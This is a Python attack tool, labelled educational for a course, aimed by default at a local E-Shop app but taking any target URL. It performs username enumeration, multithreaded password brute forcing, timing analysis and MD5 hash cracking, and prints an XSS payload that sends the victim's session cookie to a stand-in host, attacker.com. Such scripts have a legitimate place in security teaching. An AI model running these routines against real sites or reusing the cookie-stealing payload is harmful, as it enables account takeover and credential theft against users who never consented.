#!/usr/bin/env python3
"""
Authentication Vulnerability Exploitation Script for E-Shop Application
Educational Purpose Only - Part of CDS201 Course

This script demonstrates authentication vulnerabilities including:
- User enumeration
- Brute force attacks
- Session hijacking
- Password hash cracking
"""

import requests
import sys
import time
import hashlib
import concurrent.futures
from colorama import init, Fore, Style
import statistics

# Initialize colorama for colored output
init(autoreset=True)

BASE_URL = "http://localhost:8000"


class AuthExploit:
    def __init__(self, base_url=BASE_URL):
        self.base_url = base_url
        self.session = requests.Session()
        self.valid_users = []
        
    def user_enumeration(self, wordlist=None):
        """Enumerate valid usernames based on different error messages"""
        print(f"{Fore.YELLOW}[*] Starting user enumeration...")
        
        # Default username list if no wordlist provided
        if not wordlist:
            usernames = [
                'admin', 'administrator', 'root', 'test', 'user', 'demo',
                'guest', 'operator', 'support', 'manager', 'superuser',
                'user1', 'user2', 'testuser', 'webmaster', 'info'
            ]
        else:
            with open(wordlist, 'r') as f:
                usernames = f.read().splitlines()
        
        found_users = []
        
        for username in usernames:
            data = {
                'username': username,
                'password': 'wrongpassword123'
            }
            
            try:
                response = self.session.post(f"{self.base_url}/login/", data=data)
                
                # Check for user enumeration vulnerability
                if "does not exist" in response.text:
                    print(f"{Fore.RED}[-] Invalid user: {username}")
                elif "Invalid password" in response.text:
                    print(f"{Fore.GREEN}[+] Valid user found: {username}")
                    found_users.append(username)
                elif "Account is disabled" in response.text:
                    print(f"{Fore.YELLOW}[!] Disabled user found: {username}")
                    found_users.append(username)
                else:
                    print(f"{Fore.CYAN}[?] Unknown response for: {username}")
                    
            except Exception as e:
                print(f"{Fore.RED}[-] Error checking {username}: {e}")
        
        self.valid_users = found_users
        print(f"\n{Fore.GREEN}[+] Found {len(found_users)} valid users: {', '.join(found_users)}")
        return found_users
    
    def brute_force_password(self, username, wordlist=None, threads=50):
        """Brute force password for a specific user"""
        print(f"{Fore.YELLOW}[*] Starting brute force attack on user: {username}")
        print(f"{Fore.CYAN}[*] Using {threads} threads")
        
        # Default password list if no wordlist provided
        if not wordlist:
            passwords = [
                'password', '123456', 'password123', 'admin', 'letmein',
                'welcome', 'monkey', '1234567890', 'qwerty', 'abc123',
                'Password1', 'password1', '123456789', 'welcome123',
                'admin123', 'testpass123', 'demo123', 'changeme'
            ]
        else:
            with open(wordlist, 'r') as f:
                passwords = f.read().splitlines()
        
        def try_password(password):
            """Try a single password"""
            data = {
                'username': username,
                'password': password
            }
            
            try:
                response = self.session.post(f"{self.base_url}/login/", data=data)
                
                # Check if login successful
                if response.status_code == 302 or "logout" in response.text.lower():
                    return password
                elif "Invalid password" not in response.text and "does not exist" not in response.text:
                    # Might be successful if no error message
                    return password
                    
            except:
                pass
            
            return None
        
        # Use thread pool for concurrent requests
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            future_to_password = {executor.submit(try_password, pwd): pwd for pwd in passwords}
            
            for future in concurrent.futures.as_completed(future_to_password):
                result = future.result()
                if result:
                    print(f"\n{Fore.GREEN}[+] Password found: {result}")
                    return result
        
        print(f"{Fore.RED}[-] Password not found in wordlist")
        return None
    
    def timing_attack_analysis(self, iterations=10):
        """Analyze response times to detect valid usernames"""
        print(f"{Fore.YELLOW}[*] Performing timing attack analysis...")
        print(f"{Fore.CYAN}[*] Running {iterations} iterations per username")
        
        test_users = ['admin', 'administrator', 'doesnotexist1', 'doesnotexist2', 'test', 'nonexistent']
        timing_results = {}
        
        for username in test_users:
            times = []
            
            for _ in range(iterations):
                data = {
                    'username': username,
                    'password': 'wrongpassword'
                }
                
                start_time = time.time()
                try:
                    self.session.post(f"{self.base_url}/login/", data=data)
                except:
                    pass
                end_time = time.time()
                
                times.append(end_time - start_time)
            
            avg_time = statistics.mean(times)
            std_dev = statistics.stdev(times) if len(times) > 1 else 0
            
            timing_results[username] = {
                'avg': avg_time,
                'std': std_dev,
                'min': min(times),
                'max': max(times)
            }
            
            print(f"{Fore.CYAN}[{username}] Avg: {avg_time:.4f}s (Â±{std_dev:.4f}s)")
        
        # Analyze results
        print(f"\n{Fore.YELLOW}[*] Analysis:")
        avg_times = [r['avg'] for r in timing_results.values()]
        threshold = statistics.mean(avg_times) + statistics.stdev(avg_times)
        
        for username, results in timing_results.items():
            if results['avg'] > threshold:
                print(f"{Fore.GREEN}[+] {username} - Likely valid (slower response)")
            else:
                print(f"{Fore.RED}[-] {username} - Likely invalid (faster response)")
        
        return timing_results
    
    def session_hijack_demo(self):
        """Demonstrate session hijacking vulnerability"""
        print(f"{Fore.YELLOW}[*] Demonstrating session hijacking vulnerability...")
        
        # First, we need to login to get a session
        print(f"{Fore.CYAN}[*] Creating a test session...")
        
        # This would normally require valid credentials
        test_data = {
            'username': 'testuser',
            'password': 'testpass123'
        }
        
        response = self.session.post(f"{self.base_url}/login/", data=test_data)
        
        if 'sessionid' in self.session.cookies:
            session_id = self.session.cookies['sessionid']
            print(f"{Fore.GREEN}[+] Session ID obtained: {session_id[:20]}...")
            
            print(f"\n{Fore.YELLOW}[*] Session hijacking PoC:")
            print(f"{Fore.CYAN}1. Session cookies are not HttpOnly (can be stolen via XSS)")
            print(f"{Fore.CYAN}2. Session cookies are not Secure (sent over HTTP)")
            print(f"{Fore.CYAN}3. No SameSite protection (vulnerable to CSRF)")
            
            # Generate JavaScript payload for session theft
            js_payload = f"""
<script>
// Steal session cookie
var sessionId = document.cookie.match(/sessionid=([^;]+)/)[1];
// Send to attacker
new Image().src = 'http://attacker.com/steal?session=' + sessionId;
</script>
"""
            print(f"\n{Fore.YELLOW}[*] XSS payload to steal session:")
            print(f"{Fore.RED}{js_payload}")
            
            # Show how to use stolen session
            print(f"\n{Fore.YELLOW}[*] Using stolen session:")
            print(f"{Fore.CYAN}curl -H 'Cookie: sessionid={session_id[:20]}...' {self.base_url}/profile/")
            
        else:
            print(f"{Fore.RED}[-] Could not obtain session (login may have failed)")
    
    def crack_md5_hash(self, hash_to_crack, wordlist=None):
        """Crack MD5 password hash"""
        print(f"{Fore.YELLOW}[*] Attempting to crack MD5 hash: {hash_to_crack}")
        
        # Default password list if no wordlist provided
        if not wordlist:
            passwords = [
                'password', '123456', 'password123', 'admin', 'letmein',
                'welcome', 'monkey', '1234567890', 'qwerty', 'abc123'
            ]
        else:
            with open(wordlist, 'r') as f:
                passwords = f.read().splitlines()
        
        # Check if it's a Django MD5 hash format
        if '$' in hash_to_crack:
            parts = hash_to_crack.split('$')
            if len(parts) >= 3 and parts[0] == 'md5':
                salt = parts[1]
                target_hash = parts[2]
                
                print(f"{Fore.CYAN}[*] Django MD5 format detected")
                print(f"{Fore.CYAN}[*] Salt: {salt}")
                
                for password in passwords:
                    # Django MD5 format: md5(salt + password)
                    salted = salt + password
                    hash_attempt = hashlib.md5(salted.encode()).hexdigest()
                    
                    if hash_attempt == target_hash:
                        print(f"{Fore.GREEN}[+] Password found: {password}")
                        return password
        else:
            # Plain MD5
            for password in passwords:
                hash_attempt = hashlib.md5(password.encode()).hexdigest()
                
                if hash_attempt == hash_to_crack:
                    print(f"{Fore.GREEN}[+] Password found: {password}")
                    return password
        
        print(f"{Fore.RED}[-] Password not found in wordlist")
        return None
    
    def automated_scan(self):
        """Run all authentication tests automatically"""
        print(f"{Fore.CYAN}{Style.BRIGHT}=== Authentication Vulnerability Scanner ==={Style.RESET_ALL}")
        print(f"{Fore.CYAN}Target: {self.base_url}")
        print(f"{Fore.CYAN}{'='*40}")
        
        # User enumeration
        print(f"\n{Fore.YELLOW}[1] User Enumeration")
        users = self.user_enumeration()
        
        # Timing attack
        print(f"\n{Fore.YELLOW}[2] Timing Attack Analysis")
        self.timing_attack_analysis(iterations=5)
        
        # Brute force demo
        if users:
            print(f"\n{Fore.YELLOW}[3] Brute Force Demo")
            print(f"{Fore.CYAN}[*] Testing weak passwords on user: {users[0]}")
            self.brute_force_password(users[0])
        
        # Session hijacking demo
        print(f"\n{Fore.YELLOW}[4] Session Security Analysis")
        self.session_hijack_demo()
        
        # MD5 cracking demo
        print(f"\n{Fore.YELLOW}[5] Password Hash Analysis")
        print(f"{Fore.CYAN}[*] MD5 is used instead of secure algorithms")
        demo_hash = "md5$salt$5f4dcc3b5aa765d61d8327deb882cf99"  # 'password'
        self.crack_md5_hash(demo_hash)
        
        print(f"\n{Fore.GREEN}{Style.BRIGHT}[+] Authentication scan completed!")
        print(f"{Fore.RED}[!] Critical vulnerabilities found:")
        print(f"{Fore.RED}    - User enumeration via error messages")
        print(f"{Fore.RED}    - No rate limiting (brute force possible)")
        print(f"{Fore.RED}    - Weak password hashing (MD5)")
        print(f"{Fore.RED}    - Insecure session management")


def main():
    """Main function to run authentication exploits"""
    
    print(f"{Fore.CYAN}{Style.BRIGHT}")
    print("=" * 50)
    print("Authentication Exploit Tool - E-Shop Application")
    print("Educational Purpose Only - CDS201 Course")
    print("=" * 50)
    print(f"{Style.RESET_ALL}")
    
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    else:
        base_url = BASE_URL
    
    exploit = AuthExploit(base_url)
    
    while True:
        print(f"\n{Fore.CYAN}Select an option:")
        print("1. Run automated scan")
        print("2. User enumeration")
        print("3. Brute force attack")
        print("4. Timing attack analysis")
        print("5. Session hijacking demo")
        print("6. Crack MD5 hash")
        print("0. Exit")
        
        try:
            choice = input(f"{Fore.YELLOW}Enter choice: {Style.RESET_ALL}")
            
            if choice == "1":
                exploit.automated_scan()
            elif choice == "2":
                wordlist = input("Enter username wordlist (leave empty for default): ").strip()
                exploit.user_enumeration(wordlist if wordlist else None)
            elif choice == "3":
                username = input("Enter username to attack: ")
                wordlist = input("Enter password wordlist (leave empty for default): ").strip()
                threads = int(input("Number of threads (default 50): ") or "50")
                exploit.brute_force_password(username, wordlist if wordlist else None, threads)
            elif choice == "4":
                iterations = int(input("Number of iterations per user (default 10): ") or "10")
                exploit.timing_attack_analysis(iterations)
            elif choice == "5":
                exploit.session_hijack_demo()
            elif choice == "6":
                hash_input = input("Enter MD5 hash to crack: ")
                wordlist = input("Enter password wordlist (leave empty for default): ").strip()
                exploit.crack_md5_hash(hash_input, wordlist if wordlist else None)
            elif choice == "0":
                print(f"{Fore.GREEN}[+] Exiting...")
                break
            else:
                print(f"{Fore.RED}[-] Invalid choice!")
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Interrupted by user")
            break
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {e}")


if __name__ == "__main__":
    main()